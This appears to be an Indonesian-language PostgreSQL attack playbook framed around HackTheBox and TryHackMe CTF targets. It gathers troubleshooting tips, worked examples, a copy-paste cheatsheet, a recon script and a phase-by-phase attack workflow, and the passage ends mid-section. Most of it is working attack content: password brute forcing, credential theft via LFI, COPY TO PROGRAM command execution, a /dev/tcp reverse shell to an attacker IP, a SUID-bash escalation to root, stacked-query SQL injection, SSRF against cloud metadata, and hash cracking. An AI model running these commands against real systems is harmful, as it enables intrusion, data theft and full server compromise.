```

---

## 🔧 BAGIAN 8: COMMON ERRORS & TROUBLESHOOTING (10 ERROR SOLUTIONS)

### 1. `psql: error: FATAL: role "postgres" does not exist`
* **Penyebab**: Nama role default telah diubah oleh administrator menjadi nama spesifik aplikasi (misal `app_admin` atau `dbuser`).
* **Solusi CLI**: Gunakan Nmap script untuk menemukan nama role yang valid, atau periksa file konfigurasi web target:
```bash
nmap -p 5432 --script pgsql-brute --script-args "passdb=''" $TARGET
```

---

### 2. `psql: error: FATAL: password authentication failed for user "postgres"`
* **Penyebab**: Kata sandi salah atau metode otentikasi `md5` / `scram-sha-256` diwajibkan oleh `pg_hba.conf`.
* **Solusi**: Gunakan kamus kata sandi terarah melalui Hydra atau periksa *credential reuse* dari service SSH/SMB.

---

### 3. `ERROR: must be superuser to COPY to or from an external program`
* **Penyebab**: Akun database Anda bukan berstatus superuser sehingga kernel database menolak eksekusi program OS.
* **Solusi**: Periksa apakah user memiliki hak eskalasi (`CREATEROLE`), atau beralih ke pencurian data kredensial di dalam tabel database.

---

### 4. `ERROR: permission denied for function pg_read_file`
* **Penyebab**: Akun tidak memiliki hak akses membaca file server.
* **Solusi**: Periksa apakah akun adalah anggota dari group role `pg_read_server_files` (`\du`).

---

### 5. `psql: error: could not connect to server: Connection refused`
* **Penyebab**: PostgreSQL hanya mendengarkan di interface localhost (`listen_addresses = 'localhost'`) atau firewall memblokir port 5432.
* **Solusi CLI**: Lakukan SSH Local Port Forwarding jika sudah memiliki shell di target:
```bash
ssh -L 55432:127.0.0.1:5432 user@$TARGET -N -f
psql -h 127.0.0.1 -p 55432 -U postgres
```

---

### 6. `FATAL: no pg_hba.conf entry for host "IP", user "postgres", database "postgres"`
* **Penyebab**: Alamat IP Anda tidak terdaftar di dalam whitelist file `pg_hba.conf`.
* **Solusi**: Akses harus di-pivot melalui mesin internal yang berada dalam subnet yang diizinkan, atau gunakan SSH tunnel.

---

### 7. `psql: error: FATAL: no pg_hba.conf entry for host ... SSL off`
* **Penyebab**: Server mewajibkan koneksi terenkripsi SSL/TLS (`hostssl`).
* **Solusi CLI**: Tambahkan parameter pemaksaan SSL pada perintah psql:
```bash
psql "sslmode=require host=$TARGET port=5432 dbname=postgres user=postgres"
```

---

### 8. Sesi `psql` Macet (*Hang*) Saat Melakukan Koneksi
* **Penyebab**: Masalah ukuran MTU paket pada jaringan VPN CTF atau server menunggu input otentikasi identitas GSSAPI.
* **Solusi CLI**: Matikan otentikasi GSSAPI secara eksplisit:
```bash
PGGSSENCMODE=disable psql -h $TARGET -U postgres -d postgres
```

---

### 9. `ERROR: extension "dblink" is not available`
* **Penyebab**: Paket ekstensi tambahan (`postgresql-contrib`) belum terpasang di sistem operasi server.
* **Solusi**: Gunakan metode eksekusi lain seperti `COPY TO PROGRAM` yang merupakan fitur inti mesin database.

---

### 10. `FATAL: Peer authentication failed for user "postgres"`
* **Penyebab**: Anda menjalankan perintah di shell lokal target, tetapi nama user Linux Anda saat ini (misal `www-data`) tidak cocok dengan user `postgres`.
* **Solusi CLI**: Pindah ke konteks user postgres terlebih dahulu:
```bash
sudo -u postgres psql
```

---

## 🏆 BAGIAN 9: REAL CTF EXAMPLES

---

### 📝 EXAMPLE 1: PostgreSQL Trust Authentication ➔ `COPY TO PROGRAM` ➔ Reverse Shell

**Target**: HackTheBox — Linux Target

#### Step 1: Deteksi Koneksi Tanpa Password
```bash
psql -h 10.10.10.190 -U postgres -d postgres -w -c "SELECT current_user;"
```
* **Output**:
```text
 current_user 
--------------
 postgres
(1 row)
```

#### Step 2: Konfirmasi Hak Superuser
```sql
SELECT usesuper FROM pg_user WHERE usename = 'postgres';
-- Output: t (Superuser Aktif!)
```

#### Step 3: Eksekusi Reverse Shell ke Parrot OS
```bash
# Di Terminal 1 Parrot OS:
nc -lvnp 4444
```

```sql
-- Di Terminal 2 (Prompt psql):
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"';
```

#### Step 4: Shell Masuk di Netcat Listener
```text
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.190] 48922
postgres@target:~$ id
uid=106(postgres) gid=113(postgres) groups=113(postgres)
```

---

### 📝 EXAMPLE 2: SQL Injection Web App ➔ Stacked Query ➔ Output Capture

**Target**: Web Application dengan Backend PostgreSQL

#### Step 1: Uji Stacked Query Injection
Aplikasi web rentan pada parameter pencarian:
```text
http://10.10.11.165/search.php?query=test'; CREATE TABLE cmd_out(res text);--
```

#### Step 2: Eksekusi Perintah Sistem ke Tabel
```text
http://10.10.11.165/search.php?query=test'; COPY cmd_out FROM PROGRAM 'cat /etc/passwd';--
```

#### Step 3: Tampilkan Hasil Output Melalui Union Select
```text
http://10.10.11.165/search.php?query=test' UNION SELECT res FROM cmd_out;--
# Konten /etc/passwd berhasil muncul di antarmuka halaman web!
```

---

### 📝 EXAMPLE 3: Low-Priv Shell ➔ Local Trust `pg_hba.conf` ➔ Superuser Root

**Target**: TryHackMe — Hardened Web Server

#### Step 1: Audit File Konfigurasi Lokal
Setelah memperoleh shell awal sebagai `www-data`:
```bash
cat /etc/postgresql/12/main/pg_hba.conf | grep -v "^#"
```
* **Ditemukan Baris Kritis**:
```text
local   all             all                                     trust
```

#### Step 2: Masuk ke Prompt Database Tanpa Password
```bash
psql -U postgres -d postgres
```

#### Step 3: Beri Bit SUID pada Biner Bash
```sql
COPY (SELECT '') TO PROGRAM 'chmod u+s /bin/bash';
\q
```

#### Step 4: Ambil Shell Root
```bash
/bin/bash -p
whoami
# Output: root
cat /root/root.txt
```

---

## ⚡ BAGIAN 10: CHEATSHEET POSTGRESQL (COPY-PASTE READY)

Gunakan variabel environment berikut di terminal Parrot OS Anda:

```bash
export TARGET="10.10.11.200"
export DB_USER="postgres"
export DB_PASS="postgres"
export DB_NAME="postgres"
export ATTACKER_IP="10.10.14.5"
export ATTACKER_PORT="4444"
```

```bash
# ==========================================
# 1. CONNECTION COMMANDS
# ==========================================
psql -h $TARGET -U $DB_USER -d $DB_NAME                           # Connect interaktif
psql -h $TARGET -U $DB_USER -d $DB_NAME -w                       # Uji trust auth (no pass)
psql -h $TARGET -U $DB_USER -d $DB_NAME -c "SELECT version();"   # Single query run
PGPASSWORD="$DB_PASS" psql -h $TARGET -U $DB_USER -d $DB_NAME    # Non-interactive pass

# ==========================================
# 2. PSQL META-COMMANDS (RUN INSIDE PSQL)
# ==========================================
# \l                        # List all databases
# \c database_name          # Connect to database
# \dt                       # List tables in current database
# \d table_name             # Describe table schema
# \du                       # List all roles and privileges
# \q                        # Quit psql

# ==========================================
# 3. RECONNAISSANCE QUERIES (SQL)
# ==========================================
# SELECT version();
# SELECT current_user;
# SELECT usesuper FROM pg_user WHERE usename = current_user;
# SELECT line_number, type, database, user_name, address, auth_method FROM pg_hba_file_rules();

# ==========================================
# 4. FILE OPERATIONS & FRAMEWORK LOOTING
# ==========================================
# SELECT pg_read_file('/etc/passwd');
# SELECT pg_read_file('/var/www/html/settings.py');          # Django
# SELECT pg_read_file('/var/www/app/config/database.yml');   # Rails
# SELECT pg_read_file('/var/www/html/.env');                 # Laravel / Node
# SELECT pg_ls_dir('/var/www/html');

# ==========================================
# 5. RCE VIA COPY TO/FROM PROGRAM & EXTENSIONS
# ==========================================
# Perintah Langsung:
# COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';
# Reverse Shell:
# COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"';

# Output Capture via Temporary Table:
# CREATE TABLE cmd(t text); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd; DROP TABLE cmd;

# Port Scan & Cloud Metadata via dblink:
# SELECT dblink_connect('c', 'host=192.168.1.1 port=22 connect_timeout=3');
# SELECT * FROM dblink('host=169.254.169.254 user=postgres dbname=postgres', 'SELECT 1') AS t(r int);

# ==========================================
# 6. HASH EXTRACTION & CRACKING
# ==========================================
# SELECT usename, passwd FROM pg_shadow;
# hashcat -m 10 <hash_without_md5_prefix>:<username> /usr/share/wordlists/rockyou.txt
```

---

## ⚡ BAGIAN 11: AUTOMATION SCRIPT — `postgres_auto_recon.sh`

Script bash otomatis di Parrot OS XFCE untuk mendeteksi status port 5432, menguji autentikasi `trust`, mengekstrak versi, dan memverifikasi status superuser secara otomatis:

```bash
#!/bin/bash
# ==============================================================================
# Script Name : postgres_auto_recon.sh
# Description : Otomasi Reconnaissance PostgreSQL & Trust Authentication Check
# Usage       : ./postgres_auto_recon.sh <TARGET_IP> [USER] [PASSWORD] [DATABASE]
# Example     : ./postgres_auto_recon.sh 10.10.11.200 postgres "" postgres
# ==============================================================================

TARGET=$1
USER=${2:-postgres}
PASS=$3
DB=${4:-postgres}
OUTPUT_DIR="./pgsql_results_${TARGET}"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <TARGET_IP> [USER] [PASSWORD] [DATABASE]"
    echo "Contoh: $0 10.10.11.200 postgres \"\" postgres"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo -e "\033[1;34m[*] ========================================================\033[0m"
echo -e "\033[1;34m[*] STARTING POSTGRESQL AUTO RECON: Target $TARGET\033[0m"
echo -e "\033[1;34m[*] ========================================================\033[0m"

# Step 1: Port Scan 5432
echo -e "\n\033[1;33m[+] Step 1: Verifying Port 5432 TCP...\033[0m"
sudo nmap -sS -p 5432 -Pn "$TARGET" -oN "$OUTPUT_DIR/nmap_port5432.txt" 2>/dev/null

if grep -q "open" "$OUTPUT_DIR/nmap_port5432.txt"; then
    echo -e "\033[1;32m[+] Port 5432 PostgreSQL Terdeteksi Terbuka!\033[0m"
else
    echo -e "\033[1;31m[-] Port 5432 tidak merespons atau diblokir firewall.\033[0m"
    exit 1
fi

# Step 2: Testing Trust Authentication (No Password)
echo -e "\n\033[1;33m[+] Step 2: Testing Trust Authentication (User: $USER)...\033[0m"
psql -h "$TARGET" -U "$USER" -d "$DB" -w -c "SELECT version(); SELECT usesuper FROM pg_user WHERE usename = current_user;" > "$OUTPUT_DIR/trust_test.txt" 2>&1

if grep -q "version" "$OUTPUT_DIR/trust_test.txt"; then
    echo -e "\033[1;32m[!] TIKET EMAS: TRUST AUTHENTICATION AKTIF! Login Berhasil Tanpa Password!\033[0m"
    cat "$OUTPUT_DIR/trust_test.txt"
    
    if grep -q "t" "$OUTPUT_DIR/trust_test.txt"; then
        echo -e "\n\033[1;31m========================================================\033[0m"
        echo -e "\033[1;31m  🔥 USER BERSTATUS SUPERUSER! RCE COPY TO PROGRAM AKTIF! \033[0m"
        echo -e "\033[1;31m========================================================\033[0m"
        echo -e "Eksekusi RCE via psql:"
        echo -e "psql -h $TARGET -U $USER -d $DB -c \"COPY (SELECT '') TO PROGRAM 'id > /tmp/out';\""
    fi
else
    echo -e "\033[1;33m[-] Trust authentication tidak aktif. Membutuhkan password.\033[0m"
    
    # Step 3: Testing with Provided Password (jika diberikan)
    if [ -n "$PASS" ]; then
        echo -e "\n\033[1;33m[+] Step 3: Testing with Provided Credentials...\033[0m"
        PGPASSWORD="$PASS" psql -h "$TARGET" -U "$USER" -d "$DB" -c "SELECT version();" > "$OUTPUT_DIR/cred_test.txt" 2>&1
        if grep -q "version" "$OUTPUT_DIR/cred_test.txt"; then
            echo -e "\033[1;32m[+] KREDENSIAL VALID! Login berhasil.\033[0m"
            cat "$OUTPUT_DIR/cred_test.txt"
        else
            echo -e "\033[1;31m[-] Kredensial yang diberikan gagal.\033[0m"
        fi
    fi
fi

echo -e "\n\033[1;34m[*] Reconnaissance PostgreSQL selesai! Hasil tersimpan di: $OUTPUT_DIR/\033[0m"
```

```bash
# Cara Menjalankan Script di Parrot OS:
chmod +x postgres_auto_recon.sh
./postgres_auto_recon.sh 10.10.11.200 postgres "" postgres
```

---

# 14c. PostgreSQL Complete Attack Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah kecuali diarahkan.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"        # IP tun0 kamu (VPN HTB/THM)
export LPORT="4444"
export DB_USER="postgres"
export DB_PASS=""
export DB_NAME="postgres"
mkdir -p ~/pgsql_loot/{files,creds,hashes,shells}
cd ~/pgsql_loot

echo "[*] Target: $TARGET | DB_USER: $DB_USER | LHOST: $LHOST"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | DB_USER: postgres | LHOST: 10.10.14.5
```

---

## ═══════════════════════════════════════

## FASE 0: KONFIRMASI PORT AKTIF

## ═══════════════════════════════════════

### Langkah 0.1 — Ping Test (Deteksi OS via TTL)

Bash

```
ping -c 3 $TARGET
```

**OUTPUT BERHASIL ✅ — TTL ~64 (Linux):**

text

```
64 bytes from 10.10.11.200: icmp_seq=1 ttl=63 time=18.4 ms
```

➡️ **Kesimpulan:** Target Linux → PostgreSQL sangat umum di sini. Lanjut ke **Langkah 0.2**

**OUTPUT BERHASIL ✅ — TTL ~128 (Windows):**

text

```
64 bytes from 10.10.11.200: icmp_seq=1 ttl=127 time=45.2 ms
```

➡️ **Kesimpulan:** Target Windows → PostgreSQL lebih jarang, tapi ada. Jika dapat shell nanti, service account punya SeImpersonatePrivilege → GodPotato. Lanjut ke **Langkah 0.2**

**OUTPUT GAGAL ❌ — Request timeout:**

text

```
Request timeout for icmp_seq 0
```

➡️ Firewall blokir ICMP. Tambahkan `-Pn` ke semua nmap. Lanjut ke **Langkah 0.2**

---

### Langkah 0.2 — Fast Port Check (Konfirmasi PostgreSQL aktif)

Bash

```
# Command 1: Quick TCP check port 5432
nmap -Pn -p 5432 --open $TARGET

# Command 2: Sekalian cek semua database ports
nmap -Pn -p 5432,3306,1433,27017,6379 --open $TARGET -oN nmap_db_quick.txt

# Command 3: Test koneksi langsung (paling cepat untuk trust auth check)
psql -h $TARGET -U postgres -d postgres -w -c "SELECT 1;" 2>/dev/null \
    && echo "[!] JACKPOT: TRUST AUTH AKTIF — Login Tanpa Password!" \
    || echo "[-] Membutuhkan Password atau Port tertutup."
```

**OUTPUT BERHASIL ✅ — Port 5432 open:**

text

```
PORT     STATE SERVICE
5432/tcp open  postgresql
```

➡️ PostgreSQL aktif dan bisa diakses dari luar. Lanjut ke **Langkah 0.3**

**OUTPUT BERHASIL ✅ — JACKPOT Trust Auth:**

text

```
[!] JACKPOT: TRUST AUTH AKTIF — Login Tanpa Password!
```

➡️ **Langsung loncat ke FASE 2!** Trust auth = login tanpa password sebagai postgres superuser.

**OUTPUT GAGAL ❌ — Port 5432 filtered/closed:**

text

```
PORT     STATE    SERVICE
5432/tcp filtered postgresql
```

➡️ PostgreSQL hanya listen di localhost (`listen_addresses = 'localhost'`). Cek jika ada cara pivot:

Bash

```
# Jika sudah punya SSH access ke target:
ssh -L 55432:127.0.0.1:5432 user@$TARGET -N -f &
sleep 2
psql -h 127.0.0.1 -p 55432 -U postgres -d postgres -w
```

---

### Langkah 0.3 — Nmap Detailed Fingerprint PostgreSQL

Bash

```
# Command 1: Service version + default scripts
nmap -sV -sC -p 5432 $TARGET -oN nmap_pgsql_detail.txt

# Command 2: Brute force credential dengan Nmap NSE (cek default/empty password)
nmap -p 5432 --script pgsql-brute \
    --script-args "userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt" \
    $TARGET

# Command 3: Cek versi secara cepat via netcat
nc -zv $TARGET 5432 2>&1
```

**OUTPUT BERHASIL ✅ — nmap sV:**

text

```
PORT     STATE SERVICE    VERSION
5432/tcp open  postgresql PostgreSQL DB 12.5 - 14.0
| postgresql-brute:
|   Accounts:
|     postgres:postgres - Valid credentials
|_  Statistics: Performed 15 guesses in 10 seconds
```

**Cara baca output ini — PENTING:**

|Field|Nilai Contoh|Arti & Tindakan|
|---|---|---|
|`PostgreSQL DB 12.5`|Versi|Cek CVE sesuai versi (12.x, 13.x, 14.x, 15.x)|
|`postgres:postgres`|Credentials|Default password! Login langsung|
|`trust` di pg_hba.conf|Auth method|Login tanpa password sama sekali|

**OUTPUT BERHASIL ✅ — pgsql-brute menemukan credentials:**

text

```
| Accounts:
|     postgres:postgres - Valid credentials
```

➡️ **SIMPAN DAN LOGIN:**

Bash

```
export DB_PASS="postgres"
echo "postgres:postgres" >> ~/pgsql_loot/creds/found_creds.txt
# Lanjut ke FASE 2
```

**OUTPUT GAGAL ❌ — pgsql-brute tidak menemukan:**

text

```
| (nothing)
```

➡️ Default password tidak berhasil. Lanjut ke **Fase 1 (Credential Discovery)**

> 📌 **SIMPAN INFO INI:**
> 
> Bash
> 
> ```
> PG_VERSION=$(grep "PostgreSQL DB" nmap_pgsql_detail.txt | awk '{print $5}')
> echo "PostgreSQL Version: $PG_VERSION"
> # Google: "PostgreSQL $PG_VERSION CVE" atau "site:exploit-db.com PostgreSQL $PG_VERSION"
> ```

---

## ═══════════════════════════════════════

## FASE 1: CREDENTIAL DISCOVERY (Sebelum Login)

## ═══════════════════════════════════════

> **Tujuan:** Temukan credentials PostgreSQL dari berbagai sumber. Lebih efisien dari brute force.

### Langkah 1.1 — Cari Credentials dari Config Web App (PALING SERING DI CTF!)

Bash

```
# Jika ada akses ke file system target (via LFI, SMB, SSH, dll):

# Django Applications (Python) — paling umum dengan PostgreSQL
# Via LFI:
curl -s "http://$TARGET/vuln.php?file=/var/www/html/settings.py" | grep -iE "password|DATABASE"
curl -s "http://$TARGET/vuln.php?file=/opt/app/core/settings.py"

# Ruby on Rails
curl -s "http://$TARGET/vuln.php?file=/var/www/app/config/database.yml"

# Laravel / PHP
curl -s "http://$TARGET/vuln.php?file=/var/www/html/.env" | grep -iE "DB_|POSTGRES"

# Node.js / Express
curl -s "http://$TARGET/vuln.php?file=/opt/app/.env"
curl -s "http://$TARGET/vuln.php?file=/opt/app/config/default.json"

# Jika sudah punya shell (sebagai www-data):
find /var/www/ -name "settings.py" -o -name "database.yml" -o -name ".env" 2>/dev/null
grep -rE "postgres|5432|DB_PASS|DB_USER" /var/www/ 2>/dev/null | head -30
```

**OUTPUT BERHASIL ✅ — Django settings.py:**

Python

```
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'NAME': 'myapp_db',
        'USER': 'dbuser',
        'PASSWORD': 'Sup3rS3cr3tP@ss!',
        'HOST': 'localhost',
        'PORT': '5432',
    }
}
```

➡️ **SIMPAN:**

Bash

```
export DB_USER="dbuser"
export DB_PASS="Sup3rS3cr3tP@ss!"
export DB_NAME="myapp_db"
echo "PostgreSQL - $DB_USER:$DB_PASS ($DB_NAME)" >> ~/pgsql_loot/creds/found_creds.txt
```

**OUTPUT BERHASIL ✅ — Laravel .env:**

text

```
DB_CONNECTION=pgsql
DB_HOST=127.0.0.1
DB_PORT=5432
DB_DATABASE=laravel_prod
DB_USERNAME=laravel_user
DB_PASSWORD=LaravelDBPass2024!
```

➡️ Simpan dan lanjut ke Fase 2.

**OUTPUT GAGAL ❌ — Tidak ada akses ke config:**  
➡️ Lanjut ke **Langkah 1.2**

---

### Langkah 1.2 — Test Credential Reuse & Common Passwords

Bash

```
# Test common default passwords untuk postgres
psql -h $TARGET -U postgres -d postgres -w -c "SELECT 1;" 2>/dev/null && echo "[+] TRUST AUTH!"
nxc postgres $TARGET -u 'postgres' -p ''          # blank
nxc postgres $TARGET -u 'postgres' -p 'postgres'  # default
nxc postgres $TARGET -u 'postgres' -p 'password'  # common
nxc postgres $TARGET -u 'postgres' -p 'admin'     # common
nxc postgres $TARGET -u 'postgres' -p 'root'      # common
nxc postgres $TARGET -u 'postgres' -p '123456'    # common

# Jika ada creds dari service lain (SMB, SSH):
nxc postgres $TARGET -u "$USER" -p "$PASS"
PGPASSWORD="$PASS" psql -h $TARGET -U "$USER" -d postgres -c "SELECT 1;" 2>/dev/null && echo "[+] VALID!"
```

**OUTPUT BERHASIL ✅ — NetExec:**

text

```
POSTGRES  10.10.11.200  5432  10.10.11.200  [+] postgres:postgres
```

➡️ Simpan dan lanjut ke Fase 2.

**OUTPUT GAGAL ❌ — Semua gagal:**  
➡️ Lanjut ke **Langkah 1.3 — Brute Force**

---

### Langkah 1.3 — Brute Force

Bash

```
# Command 1: Hydra
hydra -l postgres -P /usr/share/wordlists/rockyou.txt \
    postgresql://$TARGET -t 4 -V

# Command 2: Nmap pgsql-brute dengan wordlist lebih besar
nmap -p 5432 --script pgsql-brute \
    --script-args "userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt,passdb=/usr/share/wordlists/rockyou.txt" \
    $TARGET

# Command 3: Metasploit login scanner
msfconsole -q -x "
use auxiliary/scanner/postgres/postgres_login;
set RHOSTS $TARGET;
set USERNAME postgres;
set PASS_FILE /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt;
set STOP_ON_SUCCESS true;
run;
exit
"

# Command 4: NetExec dengan wordlist
nxc postgres $TARGET -u postgres \
    -p /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
    --continue-on-success | grep "\[+\]"
```

**OUTPUT BERHASIL ✅ — Hydra crack:**

text

```
[5432][postgres] host: 10.10.11.200   login: postgres   password: dragon123
```

➡️ **SIMPAN:**

Bash

```
export DB_PASS="dragon123"
echo "postgres:dragon123" >> ~/pgsql_loot/creds/found_creds.txt
```

**OUTPUT GAGAL ❌ — Tidak bisa crack:**

text

```
[ERROR] Not a single valid password found.
```

➡️ Kemungkinan:

1. Password sangat kuat
2. PostgreSQL hanya listen di localhost → butuh SSH tunnel (Langkah 0.2)
3. IP tidak ada di whitelist pg_hba.conf

> 💡 **Google Search saat buntu:**
> 
> - `"PostgreSQL" "pg_hba.conf" "trust" CTF HTB`
> - `site:hackthebox.com postgresql writeup`
> - `PostgreSQL [versi dari Langkah 0.3] CVE exploit`

---

## ═══════════════════════════════════════

## FASE 2: AUTENTIKASI & KONFIRMASI AKSES

## ═══════════════════════════════════════

### Langkah 2.1 — Login ke PostgreSQL

Bash

```
# Command 1: Login interaktif standar
psql -h $TARGET -U $DB_USER -d $DB_NAME

# Command 2: Login dengan password via environment variable (tidak terlihat di process list)
PGPASSWORD="$DB_PASS" psql -h $TARGET -U $DB_USER -d $DB_NAME

# Command 3: Trust auth (tidak perlu password sama sekali)
psql -h $TARGET -U postgres -d postgres -w

# Command 4: Login ke specific database
PGPASSWORD="$DB_PASS" psql -h $TARGET -U $DB_USER -d myapp_db

# Command 5: Single query test (non-interaktif)
PGPASSWORD="$DB_PASS" psql -h $TARGET -U $DB_USER -d $DB_NAME -c "SELECT version();"

# Command 6: Jika sudah dapat shell di target Linux, login via UNIX socket
sudo -u postgres psql
# atau:
su - postgres -c psql
```

**OUTPUT BERHASIL ✅ — Masuk ke prompt psql:**

text

```
psql (14.5 (Debian 14.5-2))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
```

➡️ **Berhasil masuk! Langsung ke Fase 3 — Reconnaissance**

**OUTPUT GAGAL ❌ — FATAL: password authentication failed:**

text

```
psql: error: connection to server at "10.10.11.200", port 5432 failed:
FATAL:  password authentication failed for user "postgres"
```

➡️ Password salah. Coba:

Bash

```
# Coba password lain
PGPASSWORD="postgres" psql -h $TARGET -U postgres -d postgres
PGPASSWORD="password" psql -h $TARGET -U postgres -d postgres
PGPASSWORD="" psql -h $TARGET -U postgres -d postgres
```

**OUTPUT GAGAL ❌ — FATAL: role does not exist:**

text

```
FATAL:  role "postgres" does not exist
```

➡️ Username default sudah diganti:

Bash

```
# Cari username yang benar via brute
nmap -p 5432 --script pgsql-brute \
    --script-args "userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt,passdb=''" \
    $TARGET
# Atau coba username umum lain:
PGPASSWORD="" psql -h $TARGET -U admin -d postgres
PGPASSWORD="" psql -h $TARGET -U dbadmin -d postgres
PGPASSWORD="" psql -h $TARGET -U app -d postgres
```

**OUTPUT GAGAL ❌ — Connection refused:**

text

```
psql: error: could not connect to server: Connection refused
    Is the server running on host "10.10.11.200" and accepting
    TCP/IP connections on port 5432?
```

➡️ PostgreSQL hanya listen di localhost:

Bash

```
# Butuh SSH tunnel
ssh -L 55432:127.0.0.1:5432 user@$TARGET -N -f &
sleep 2
PGPASSWORD="$DB_PASS" psql -h 127.0.0.1 -p 55432 -U postgres -d postgres
```

**OUTPUT GAGAL ❌ — no pg_hba.conf entry:**

text

```
FATAL:  no pg_hba.conf entry for host "10.10.14.5", user "postgres", database "postgres", SSL off
```

➡️ IP kamu tidak ada di whitelist pg_hba.conf:

Bash

```
# Coba dengan SSL
PGPASSWORD="$DB_PASS" psql "sslmode=require host=$TARGET port=5432 dbname=postgres user=postgres"

# Atau gunakan SSH tunnel seperti di atas
```

**OUTPUT GAGAL ❌ — psql Hang (tidak ada respon):**  
➡️ Masalah GSSAPI atau MTU VPN:

Bash

```
# Matikan GSSAPI
PGGSSENCMODE=disable PGPASSWORD="$DB_PASS" psql -h $TARGET -U postgres -d postgres
```

---

## ═══════════════════════════════════════

## FASE 3: POSTGRESQL RECONNAISSANCE (10 QUERY WAJIB)

## ═══════════════════════════════════════

> **Tujuan:** Mapping semua database, privilege, dan konfigurasi kritis. Jalankan SEMUA berurutan.

### Langkah 3.1 — Query Identifikasi Dasar

SQL

```
-- Query 1: Versi PostgreSQL + OS server
SELECT version();
```

**OUTPUT BERHASIL ✅:**

text

```
PostgreSQL 14.5 (Debian 14.5-2.pgdg110+2) on x86_64-pc-linux-gnu,
compiled by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit
```

➡️ Catat versi! PostgreSQL 9.3-11.2 → CVE-2019-9193 (COPY FROM PROGRAM). Versi 11-15 → CVE-2023-2454.

SQL

```
-- Query 2: Siapa kita?
SELECT current_user;
```

**OUTPUT BERHASIL ✅:**

text

```
 current_user
--------------
 postgres
```

---

### Langkah 3.2 — Cek Privilege SUPERUSER (PALING KRITIS!)

SQL

```
-- Query 3: Apakah kita SUPERUSER? (t=true, f=false)
SELECT usesuper FROM pg_user WHERE usename = current_user;
```

**OUTPUT BERHASIL ✅ — SUPERUSER:**

text

```
 usesuper
----------
 t
```

➡️ **`t` = SUPERUSER!** Bisa COPY TO PROGRAM → langsung ke **Fase 5 (RCE)**!

**OUTPUT TERBATAS ✅ — Bukan superuser:**

text

```
 usesuper
----------
 f
```

➡️ Privilege terbatas. Cek role membership:

SQL

```
-- Cek apakah punya role yang berguna
\du
-- Perhatikan apakah user ada di:
-- pg_read_server_files → bisa baca file sistem
-- pg_execute_server_program → bisa jalankan program OS
-- pg_write_server_files → bisa tulis file sistem
```

---

### Langkah 3.3 — Enumarasi Database & Tabel

SQL

```
-- Query 4: List semua database
SELECT datname FROM pg_database;
-- atau gunakan meta-command:
\l
```

**OUTPUT BERHASIL ✅:**

text

```
   datname
-----------
 postgres
 template1
 template0
 myapp_db
 hr_system
 backup_db
```

➡️ `myapp_db`, `hr_system`, `backup_db` = database aplikasi! Target looting.

SQL

```
-- Pindah ke database aplikasi dan list tabel
\c myapp_db

-- Lihat semua tabel di schema public
\dt

-- Atau dengan SQL:
SELECT tablename FROM pg_tables WHERE schemaname = 'public';
```

**OUTPUT BERHASIL ✅:**

text

```
          List of relations
 Schema |    Name     | Type  |  Owner
--------+-------------+-------+----------
 public | users       | table | postgres
 public | sessions    | table | postgres
 public | admin_roles | table | postgres
 public | products    | table | postgres
```

➡️ Ada tabel `users` dan `admin_roles`! Dump sekarang.

SQL

```
-- Dump tabel users
SELECT * FROM users LIMIT 20;
SELECT username, password, email, role FROM users LIMIT 20;
```

---

### Langkah 3.4 — Recon Konfigurasi Kritis

SQL

```
-- Query 5: List semua roles dan privilege mereka
SELECT rolname, rolsuper, rolinherit, rolcreaterole, rolcreatedb FROM pg_roles;
-- atau:
\du
```

**OUTPUT BERHASIL ✅:**

text

```
                                   List of roles
 Role name │         Attributes         │ Member of
───────────┼────────────────────────────┼──────────────────────────
 app_user  │                            │ {pg_read_server_files}
 postgres  │ Superuser, Create role, ..  │ {}
```

➡️ `app_user` adalah member dari `pg_read_server_files` → bisa baca file sistem!

SQL

```
-- Query 6: Baca aturan pg_hba.conf (PostgreSQL 10+)
SELECT line_number, type, database, user_name, address, auth_method
FROM pg_hba_file_rules();
```

**OUTPUT BERHASIL ✅ — Trust Auth terdeteksi:**

text

```
 line_number │ type  │ database │ user_name │   address    │ auth_method
─────────────┼───────┼──────────┼───────────┼──────────────┼─────────────
           1 │ local │ {all}    │ {all}     │              │ trust
           2 │ host  │ {all}    │ {all}     │ 0.0.0.0/0    │ trust       ← FATAL!
```

➡️ `trust` dengan `0.0.0.0/0` = siapapun bisa login tanpa password!

SQL

```
-- Query 7: Lokasi direktori data fisik
SHOW data_directory;
```

**OUTPUT:**

text

```
       data_directory
-----------------------------
 /var/lib/postgresql/14/main
```

SQL

```
-- Query 8: Ekstensi yang terpasang
SELECT * FROM pg_extension;
```

**OUTPUT BERHASIL ✅ — Ekstensi berbahaya:**

text

```
 extname   │ extowner │ extnamespace │ extrelocatable │ extversion
───────────┼──────────┼──────────────┼────────────────┼────────────
 plpgsql   │       10 │           11 │ f              │ 1.0
 dblink    │       10 │         2200 │ t              │ 1.2        ← Bisa SSRF/Port Scan!
 plpython3u│       10 │         2200 │ t              │ 1.0        ← Bisa RCE via Python!
```

➡️ `dblink` ada → ke Fase 6A (SSRF/Port Scanning)  
➡️ `plpython3u` ada → ke Fase 6B (Python RCE — lebih mudah dari COPY TO PROGRAM!)

SQL

```
